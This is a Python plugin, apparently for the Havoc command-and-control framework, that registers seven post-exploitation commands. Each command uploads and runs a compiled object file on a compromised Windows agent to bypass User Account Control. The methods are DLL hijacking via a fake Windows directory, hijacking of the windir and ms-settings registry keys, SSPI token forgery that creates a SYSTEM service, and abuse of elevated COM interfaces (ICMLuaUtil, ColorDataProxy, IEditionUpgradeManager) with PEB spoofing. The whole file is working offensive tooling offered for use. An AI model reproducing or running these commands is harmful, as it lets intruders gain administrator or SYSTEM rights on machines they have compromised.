import traceback

from pyhavoc.agent import *
from os.path       import exists, dirname


CURRENT_DIR  = dirname( __file__ )
CACHE_OBJECT = False


def file_read( path: str ) -> bytes:
    handle    = open( path, 'rb' )
    obj_bytes = handle.read()
    handle.close()
    return obj_bytes


##
## base class for UAC bypass commands
##

class UacBypassTaskBase( HcKaineCommand ):

    def __init__( self, *args, **kwargs ):
        super().__init__( *args, **kwargs )

        self.capture_output = False

        name = self.command()

        self.bof_path = self._get_bof_path()
        self.key_id   = f'obj-uac-handle.{name}'

    def _get_bof_path( self ) -> str:
        raise NotImplementedError( 'subclass must implement _get_bof_path' )

    async def execute( self, args ):
        return await self.execute_object()

    async def execute_object( self, *args, argv: bytes = None, description = '' ):
        if exists( self.bof_path ) is False:
            self.log_error( f"object file not found: {self.bof_path}" )
            return

        #
        # execute the already loaded object file if we
        # have it loaded + CACHE_OBJECT is still enabled
        #
        if self.key_id in self.agent().key_store and CACHE_OBJECT:
            task = self.agent().object_invoke(
                self.agent().key_store[ self.key_id ],
                'go',
                *args,
                object_argv  = argv,
                flag_capture = self.capture_output
            )
        else:
            task = self.agent().object_execute(
                file_read( self.bof_path ),
                'go',
                *args,
                object_argv  = argv,
                flag_cache   = CACHE_OBJECT,
                flag_capture = self.capture_output
            )

        uuid    = format( task.task_uuid(), 'x' )
        message = description

        #
        # this displays the informational message of the task being created
        # by either using the given execute_object description or use the
        # registered command description
        #
        if len( message ) == 0:
            message = self.description()
            if CACHE_OBJECT:
                message += ' (with caching enabled)'

            task.set_description( message )

        self.log_info( f'({uuid}) {message}' )

        #
        # now invoke and issue the task to the agent and wait for it to finish
        #
        try:
            result = await task.result()

            if CACHE_OBJECT and self.key_id not in self.agent().key_store:
                #
                # looks like we are not in the store meaning that the previously send
                # out task should be caching the object into memory and return us the handle
                #
                handle, output = result
                message        = f'(handle: 0x{handle:x})'

                self.agent().key_store[ self.key_id ] = handle
            else:
                #
                # normally wait for the object file to finish!
                #
                message = ''
                handle, output = 0, ''

                if len( result ) == 1:
                    output = result
                elif len( result ) == 2:
                    handle, output = result

            if len( output ) > 0 and self.capture_output:
                self.process_output( output, task.task_uuid() )
            elif self.capture_output:
                self.log_warn( f'{self.command()} has sent no output back!', task_id = task.task_uuid() )
        except Exception as e:
            self.log_error( f"({uuid}) failed to execute {self.command()}: {e}", task_id = task.task_uuid() )
            print( traceback.format_exc() )
            if str( e ) == 'STATUS_NOT_FOUND':
                self.log_warn( f'removing key store entry of {self.command()}' )
                del self.agent().key_store[ self.key_id ]
            return

        self.log_success( f"({uuid}) successfully executed {self.command()} {message}", task_id = task.task_uuid() )

    def process_output( self, output: str, task_id: int ):
        self.log_success( f'received output from {self.command()} [{len(output)} bytes]:', task_id = task_id )
        self.log_raw( output.decode(), task_id = task_id )
        return


##
## uac-trustedpath - DLL hijack via fake windows directory
##

@KnRegisterCommand( command     = 'uac-trustedpath',
                    description = 'UAC bypass via fake windows directory with ComputerDefaults.exe',
                    group       = 'Privilege escalation' )
class ObjectUacTrustedPathTask( UacBypassTaskBase ):

    def _get_bof_path( self ) -> str:
        return f"{dirname(__file__)}/TrustedPathDLLHijack/bin/TrustedPathDLLHijackBOF.o"

    @staticmethod
    def arguments( parser ):
        parser.epilog = (
            "   Perform UAC bypass via fake windows directory with ComputerDefaults.exe and Secur32.dll\n\n"
            "   Creates fake windows directory 'C:\\Windows \\', copies supplied DLL to location,\n"
            "   and executes auto-elevated EXE (ComputerDefaults.exe).\n\n"
            "   Note: x86 is not supported.\n"
        )

        parser.add_argument( 'local_dll', metavar='LOCAL_DLL', type=str, help='local path to DLL file to upload' )

    async def execute( self, args ):
        meta = self.agent().agent_meta()
        if meta['arch'] == 'x86':
            self.log_error( 'x86 is not supported for this UAC bypass' )
            return

        if not exists( args.local_dll ):
            self.log_error( f'file not found: {args.local_dll}' )
            return

        file_bytes = file_read( args.local_dll )

        return await self.execute_object(
            argv        = bof_pack( 'ib', len( file_bytes ), file_bytes ),
            description = f'performing TrustedPath UAC bypass with {args.local_dll}'
        )


##
## uac-silentcleanup - registry key + scheduled task
##

@KnRegisterCommand( command     = 'uac-silentcleanup',
                    description = 'UAC bypass via Environment\\windir registry key and SilentCleanup task',
                    group       = 'Privilege escalation' )
class ObjectUacSilentCleanupTask( UacBypassTaskBase ):

    def _get_bof_path( self ) -> str:
        return f"{dirname(__file__)}/SilentCleanupWinDir/bin/SilentCleanupWinDirBOF.o"

    @staticmethod
    def arguments( parser ):
        parser.epilog = (
            "   Perform UAC bypass via the Environment\\windir registry key and SilentCleanup scheduled task.\n\n"
            "   Modifies the 'Environment\\windir' registry key and executes the SilentCleanup\n"
            "   scheduled task to trigger the bypass.\n\n"
            "   Note: x86 is not supported.\n"
        )

        parser.add_argument( 'local_exe', metavar='LOCAL_EXE', type=str, help='local path to EXE file to upload' )

    async def execute( self, args ):
        meta = self.agent().agent_meta()
        if meta['arch'] == 'x86':
            self.log_error( 'x86 is not supported for this UAC bypass' )
            return

        if not exists( args.local_exe ):
            self.log_error( f'file not found: {args.local_exe}' )
            return

        file_bytes = file_read( args.local_exe )

        return await self.execute_object(
            argv        = bof_pack( 'ib', len( file_bytes ), file_bytes ),
            description = f'performing SilentCleanupWinDir UAC bypass with {args.local_exe}'
        )


##
## uac-sspidatagram - SSPI Datagram Contexts
##

@KnRegisterCommand( command     = 'uac-sspidatagram',
                    description = 'UAC bypass via SSPI Datagram Contexts',
                    group       = 'Privilege escalation' )
class ObjectUacSspiDatagramTask( UacBypassTaskBase ):

    def _get_bof_path( self ) -> str:
        return f"{dirname(__file__)}/SspiUacBypass/bin/SspiUacBypassBOF.o"

    @staticmethod
    def arguments( parser ):
        parser.epilog = (
            "   Perform UAC bypass via SSPI Datagram Contexts.\n\n"
            "   Forges a token from a fake network authentication through SSPI Datagram Contexts.\n"
            "   It will then impersonate the forged token and use CreateSvcRpc to create a new\n"
            "   SYSTEM service that executes the specified file.\n\n"
            "   Note: x86 is not supported.\n"
            "   Note: File must already exist on target.\n"
        )

        parser.add_argument( 'file_to_execute', metavar='FILE_TO_EXECUTE', type=str, help='file to execute on target (full path)' )

    async def execute( self, args ):
        meta = self.agent().agent_meta()
        if meta['arch'] == 'x86':
            self.log_error( 'x86 is not supported for this UAC bypass' )
            return

        return await self.execute_object(
            argv        = bof_pack( 'z', args.file_to_execute ),
            description = f'performing SSPI Datagram Contexts UAC bypass with {args.file_to_execute}'
        )


##
## uac-registrycommand - ms-settings registry key
##

@KnRegisterCommand( command     = 'uac-registrycommand',
                    description = 'UAC bypass via ms-settings\\Shell\\Open\\command registry key',
                    group       = 'Privilege escalation' )
class ObjectUacRegistryCommandTask( UacBypassTaskBase ):

    def _get_bof_path( self ) -> str:
        return f"{dirname(__file__)}/RegistryShellCommand/bin/RegistryShellCommandBOF.o"

    @staticmethod
    def arguments( parser ):
        parser.epilog = (
            "   Perform UAC bypass via modifying the ms-settings\\Shell\\Open\\command registry key.\n\n"
            "   Modifies the 'ms-settings\\Shell\\Open\\command' registry key and executes an\n"
            "   auto-elevated EXE (ComputerDefaults.exe) to trigger the bypass.\n\n"
            "   Note: x86 is not supported.\n"
            "   Note: File must already exist on target.\n"
        )

        parser.add_argument( 'file_to_execute', metavar='FILE_TO_EXECUTE', type=str, help='file to execute on target (full path)' )

    async def execute( self, args ):
        meta = self.agent().agent_meta()
        if meta['arch'] == 'x86':
            self.log_error( 'x86 is not supported for this UAC bypass' )
            return

        return await self.execute_object(
            argv        = bof_pack( 'z', args.file_to_execute ),
            description = f'performing registry command UAC bypass with {args.file_to_execute}'
        )


##
## uac-elevatedcom - ICMLuaUtil COM interface
##

@KnRegisterCommand( command     = 'uac-elevatedcom',
                    description = 'UAC bypass via ICMLuaUtil elevated COM interface',
                    group       = 'Privilege escalation' )
class ObjectUacElevatedComTask( UacBypassTaskBase ):

    def _get_bof_path( self ) -> str:
        return f"{dirname(__file__)}/CmstpElevatedCOM/bin/CmstpElevatedCOMBOF.o"

    @staticmethod
    def arguments( parser ):
        parser.epilog = (
            "   Perform UAC bypass via the ICMLuaUtil elevated COM interface.\n\n"
            "   Creates an elevated ICMLuaUtil COM object and calls its ShellExec function\n"
            "   to execute the provided file on disk. PEB is spoofed to appear as explorer.exe.\n\n"
            "   Note: x86 is not supported.\n"
            "   Note: File must already exist on target.\n"
        )

        parser.add_argument( 'file_to_execute', metavar='FILE_TO_EXECUTE', type=str, help='file to execute on target (full path)' )

    async def execute( self, args ):
        meta = self.agent().agent_meta()
        if meta['arch'] == 'x86':
            self.log_error( 'x86 is not supported for this UAC bypass' )
            return

        return await self.execute_object(
            argv        = bof_pack( 'z', args.file_to_execute ),
            description = f'performing CmstpElevatedCOM UAC bypass with {args.file_to_execute}'
        )


##
## uac-colordataproxy - ColorDataProxy COM interface
##

@KnRegisterCommand( command     = 'uac-colordataproxy',
                    description = 'UAC bypass via ColorDataProxy and elevated ICMLuaUtil COM interface',
                    group       = 'Privilege escalation' )
class ObjectUacColorDataProxyTask( UacBypassTaskBase ):

    def _get_bof_path( self ) -> str:
        return f"{dirname(__file__)}/ColorDataProxy/bin/ColorDataProxyBOF.o"

    @staticmethod
    def arguments( parser ):
        parser.epilog = (
            "   Perform UAC bypass via ColorDataProxy and elevated ICMLuaUtil COM interface.\n\n"
            "   Creates an elevated ICMLuaUtil COM object and calls its SetRegistryStringValue\n"
            "   function to write the location of the provided file to the DisplayCalibrator\n"
            "   registry value residing in HKLM. It will then create an elevated IColorDataProxy\n"
            "   COM object and call its LaunchDccw function, resulting in the execution of the\n"
            "   provided file.\n\n"
            "   Note: x86 is not supported.\n"
            "   Note: File must already exist on target.\n"
        )

        parser.add_argument( 'file_to_execute', metavar='FILE_TO_EXECUTE', type=str, help='file to execute on target (full path)' )

    async def execute( self, args ):
        meta = self.agent().agent_meta()
        if meta['arch'] == 'x86':
            self.log_error( 'x86 is not supported for this UAC bypass' )
            return

        return await self.execute_object(
            argv        = bof_pack( 'z', args.file_to_execute ),
            description = f'performing ColorDataProxy UAC bypass with {args.file_to_execute}'
        )


##
## uac-editionupgrade - IEditionUpgradeManager COM interface
##

@KnRegisterCommand( command     = 'uac-editionupgrade',
                    description = 'UAC bypass via Environment\\windir registry key and IEditionUpgradeManager COM',
                    group       = 'Privilege escalation' )
class ObjectUacEditionUpgradeTask( UacBypassTaskBase ):

    def _get_bof_path( self ) -> str:
        return f"{dirname(__file__)}/EditionUpgradeManager/bin/EditionUpgradeManagerBOF.o"

    @staticmethod
    def arguments( parser ):
        parser.epilog = (
            "   Perform UAC bypass via the Environment\\windir registry key and elevated\n"
            "   IEditionUpgradeManager COM interface.\n\n"
            "   Modifies the 'Environment\\windir' registry key, creates an elevated\n"
            "   IEditionUpgradeManager COM object, and then calls the AcquireModernLicenseWithPreviousId\n"
            "   function from the elevated COM object to execute the provided file.\n\n"
            "   Note: x86 is not supported.\n"
        )

        parser.add_argument( 'local_exe', metavar='LOCAL_EXE', type=str, help='local path to EXE file to upload' )

    async def execute( self, args ):
        meta = self.agent().agent_meta()
        if meta['arch'] == 'x86':
            self.log_error( 'x86 is not supported for this UAC bypass' )
            return

        if not exists( args.local_exe ):
            self.log_error( f'file not found: {args.local_exe}' )
            return

        file_bytes = file_read( args.local_exe )

        return await self.execute_object(
            argv        = bof_pack( 'ib', len( file_bytes ), file_bytes ),
            description = f'performing EditionUpgradeManager UAC bypass with {args.local_exe}'
        )
